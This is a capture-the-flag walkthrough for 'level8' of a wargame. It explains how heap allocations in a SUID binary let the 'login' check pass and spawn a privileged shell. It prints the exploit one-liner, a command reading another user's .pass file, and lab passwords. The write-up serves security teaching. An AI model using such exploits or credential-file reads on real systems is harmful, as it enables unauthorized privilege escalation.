# level8

## 1. Connect to the VM

The password for `level8`, obtained by solving `level7`, is:

```text
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
```

Connect with:

```bash
ssh level8@localhost -p 4242
```

## 2. Read the source

The equivalent C code obtained by decompiling the binary is available in
`source.c`.

The binary is owned by `level9` and has the SUID bit set. It therefore runs
with `level9` privileges.

The program maintains two global pointers:

```c
char    *auth;
char    *service;
```

It runs an interactive loop that dispatches on the first word of each input
line:

- `auth <name>` allocates 4 bytes, zeroes them, then copies the rest of the
  line into that buffer if its length is at most 30 characters.
- `service <data>` calls `strdup` on the rest of the line and stores the
  returned pointer in `service`.
- `reset` frees `auth`.
- `login` grants a shell if the 4-byte value 32 bytes past `auth` is non-zero,
  otherwise prints `Password:`.

The login check:

```c
if (*((int *)auth + 8))
    system("/bin/sh");
```

The objective is to make `auth + 32` non-zero using only the available commands.

## 3. Understand the heap layout

`malloc(4)` allocates only 4 bytes for `auth`. The address `auth + 32` lies
entirely outside that buffer, in the heap region used by later allocations.

The program prints the current values of `auth` and `service` at the start of
each iteration. Running `auth` once followed by two `service` calls reveals the
allocation addresses:

```text
(nil), (nil)
auth
0x804a008, (nil)
service
0x804a008, 0x804a018
service
0x804a008, 0x804a028
```

The glibc heap allocator places chunks contiguously. Each allocation occupies a
minimum of 16 bytes (8 bytes of chunk metadata plus 8 bytes of usable space):

```text
+------------+------------------+
| 0x804a008  | auth malloc(4)   |   ← auth points here
+------------+------------------+
| 0x804a018  | first strdup     |   ← service after call 1
+------------+------------------+
| 0x804a028  | second strdup    |   ← service after call 2
+------------+------------------+
```

The login check dereferences `auth + 32`:

```text
auth + 32 = 0x804a008 + 0x20 = 0x804a028
```

That address is exactly where the second `service` call places its allocation.
`strdup` writes the supplied string there. A bare `service` command stores
`strdup("\n")` at `0x804a028`; the first byte `'\n'` (0x0a) is non-zero, which
satisfies the check.

## 4. Exploit the binary

Run `auth` once and `service` twice, then `login`:

```bash
(printf 'auth \nservice\nservice\nlogin\n'; cat) | ./level8
```

Then:

```bash
cat /home/user/level9/.pass
```

The output contains:

```text
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```

This is the password stored in `flag` and can be used to connect as `level9`.
